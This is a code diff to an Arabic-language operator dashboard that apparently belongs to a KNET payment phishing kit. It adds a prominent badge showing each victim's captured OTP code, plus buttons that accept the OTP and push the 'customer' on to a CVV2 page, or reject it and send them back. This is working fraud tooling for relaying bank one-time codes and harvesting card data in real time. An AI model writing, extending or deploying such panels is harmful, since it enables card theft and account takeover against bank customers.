@@ -416,7 +416,7 @@
   }
   .knet-btn-pass {
     background: #fff;
-    border: 1px solid #d1d5db;
+    border: 2px solid #d1d5db;
     border-radius: 8px;
     padding: 10px;
     font-size: 14px;
@@ -426,9 +426,10 @@
     transition: all 0.2s;
   }
   .knet-btn-pass:hover { background: #f0fdf4; border-color: #16a34a; color: #16a34a; }
+  .knet-btn-pass.active-new { background: #f0fdf4 !important; border-color: #16a34a !important; color: #16a34a !important; font-weight: bold; box-shadow: 0 0 0 3px rgba(22,163,74,0.2); }
   .knet-btn-deny {
     background: #fff;
-    border: 1px solid #d1d5db;
+    border: 2px solid #d1d5db;
     border-radius: 8px;
     padding: 10px;
     font-size: 14px;
@@ -438,6 +439,32 @@
     transition: all 0.2s;
   }
   .knet-btn-deny:hover { background: #fef2f2; border-color: #dc2626; color: #dc2626; }
+  .knet-btn-deny.active-new { background: #fef2f2 !important; border-color: #dc2626 !important; color: #dc2626 !important; font-weight: bold; box-shadow: 0 0 0 3px rgba(220,38,38,0.2); }
+  .otp-value-badge {
+    display: inline-block;
+    background: #0891b2;
+    color: #fff;
+    font-size: 18px;
+    font-weight: bold;
+    letter-spacing: 4px;
+    padding: 6px 16px;
+    border-radius: 8px;
+    margin-top: 4px;
+  }
+  .otp-section-box {
+    background: #f0f9ff;
+    border: 2px solid #0891b2;
+    border-radius: 10px;
+    padding: 12px 16px;
+    margin-bottom: 10px;
+    text-align: center;
+  }
+  .otp-section-title {
+    font-size: 12px;
+    color: #0891b2;
+    font-weight: bold;
+    margin-bottom: 6px;
+  }
   </style>
 </head>
 <body>
@@ -774,8 +801,8 @@
     if (sec) sec.classList.remove('has-new');
     const passBtn = document.getElementById(`pay-pass-${ref}`);
     const denyBtn = document.getElementById(`pay-denied-${ref}`);
-    if (passBtn) { passBtn.classList.remove('active'); passBtn.disabled = true; passBtn.textContent = 'جاري...'; }
-    if (denyBtn) { denyBtn.classList.remove('active'); denyBtn.disabled = true; denyBtn.textContent = 'جاري...'; }
+    if (passBtn) { passBtn.classList.remove('active-new'); passBtn.disabled = true; passBtn.innerHTML = 'جاري...'; }
+    if (denyBtn) { denyBtn.classList.remove('active-new'); denyBtn.disabled = true; denyBtn.innerHTML = 'جاري...'; }
     try {
       const d = await post("/api/admin/payment-action", { reference: ref, action });
       if (d.success) {
@@ -801,10 +828,15 @@
   }
 
   async function otpAction(ref, action) {
+    newDataRefs.delete(ref);
+    const otpPassBtn = document.getElementById(`otp-pass-${ref}`);
+    const otpDenyBtn = document.getElementById(`otp-denied-${ref}`);
+    if (otpPassBtn) { otpPassBtn.classList.remove('active-new'); otpPassBtn.disabled = true; otpPassBtn.innerHTML = 'جاري...'; }
+    if (otpDenyBtn) { otpDenyBtn.classList.remove('active-new'); otpDenyBtn.disabled = true; otpDenyBtn.innerHTML = 'جاري...'; }
     try {
       const d = await post("/api/admin/otp-action", { reference: ref, action });
       if (d.success) {
-        const label = action === 'pass' ? '✅ قبول OTP - تم توجيه العميل لصفحة CVV' : '❌ تم رفض OTP';
+        const label = action === 'pass' ? '✅ قبول OTP - تم توجيه العميل لصفحة CVV2' : '❌ تم رفض OTP - سيعود لصفحة OTP';
         toast(label, action==='pass'?'ok':'err');
         loadAll();
         if (currentOpenRef && currentOpenRef === ref) {
@@ -812,9 +844,13 @@
         }
       } else {
         toast('فشل الإجراء: ' + (d.error||''), 'err');
+        if (otpPassBtn) { otpPassBtn.disabled = false; otpPassBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> قبول OTP → CVV'; }
+        if (otpDenyBtn) { otpDenyBtn.disabled = false; otpDenyBtn.innerHTML = '<i class="bi bi-x-circle-fill"></i> رفض OTP'; }
       }
     } catch(e) {
       toast('خطأ في الاتصال', 'err');
+      if (otpPassBtn) { otpPassBtn.disabled = false; otpPassBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> قبول OTP → CVV'; }
+      if (otpDenyBtn) { otpDenyBtn.disabled = false; otpDenyBtn.innerHTML = '<i class="bi bi-x-circle-fill"></i> رفض OTP'; }
     }
   }
 
@@ -840,10 +876,16 @@
       if (newDataRefs.has(ref)) {
         const sec = document.querySelector('.action-section');
         if (sec) sec.classList.add('has-new');
+        // تلوين أزرار الدفع
         const approveBtn = document.getElementById(`pay-pass-${ref}`);
         const rejectBtn = document.getElementById(`pay-denied-${ref}`);
-        if (approveBtn) approveBtn.classList.add('active');
-        if (rejectBtn) rejectBtn.classList.add('active');
+        if (approveBtn) approveBtn.classList.add('active-new');
+        if (rejectBtn) rejectBtn.classList.add('active-new');
+        // تلوين أزرار OTP إن وُجدت
+        const otpPassBtn = document.getElementById(`otp-pass-${ref}`);
+        const otpDenyBtn = document.getElementById(`otp-denied-${ref}`);
+        if (otpPassBtn) otpPassBtn.classList.add('active-new');
+        if (otpDenyBtn) otpDenyBtn.classList.add('active-new');
       }
     } catch { toast("خطأ في تحميل التفاصيل","err"); }
   }
@@ -925,12 +967,24 @@
             </div>
             <div class="knet-cell">
               <span class="knet-field-label">رمز OTP</span>
-              <span class="knet-field-val knet-otp-val">${otpVal}</span>
+              <span class="knet-field-val knet-otp-val" id="otp-val-${b.referenceId}">${otpVal}</span>
             </div>
           </div>
+
+          ${otpVal !== '-' ? `
+          <div class="otp-section-box">
+            <div class="otp-section-title">🔐 رمز OTP المُستلم</div>
+            <div class="otp-value-badge" id="otp-badge-${b.referenceId}">${otpVal}</div>
+          </div>
+          <div class="knet-action-btns" style="margin-bottom:8px;">
+            <button class="knet-btn-pass" id="otp-pass-${b.referenceId}" onclick="otpAction('${b.referenceId}','pass')"><i class="bi bi-check-circle-fill"></i> قبول OTP → CVV</button>
+            <button class="knet-btn-deny" id="otp-denied-${b.referenceId}" onclick="otpAction('${b.referenceId}','denied')"><i class="bi bi-x-circle-fill"></i> رفض OTP</button>
+          </div>` : ''}
+
+          <div style="font-size:11px;color:#6b7280;margin-bottom:6px;padding:0 2px;">أزرار الدفع (KNET/CVV):</div>
           <div class="knet-action-btns">
-            <button class="knet-btn-pass" id="pay-pass-${b.referenceId}" onclick="paymentAction('${b.referenceId}','pass')">قبول</button>
-            <button class="knet-btn-deny" id="pay-denied-${b.referenceId}" onclick="paymentAction('${b.referenceId}','denied')">رفض</button>
+            <button class="knet-btn-pass" id="pay-pass-${b.referenceId}" onclick="paymentAction('${b.referenceId}','pass')"><i class="bi bi-check-circle-fill"></i> قبول</button>
+            <button class="knet-btn-deny" id="pay-denied-${b.referenceId}" onclick="paymentAction('${b.referenceId}','denied')"><i class="bi bi-x-circle-fill"></i> رفض</button>
           </div>
         </div>`;
     }
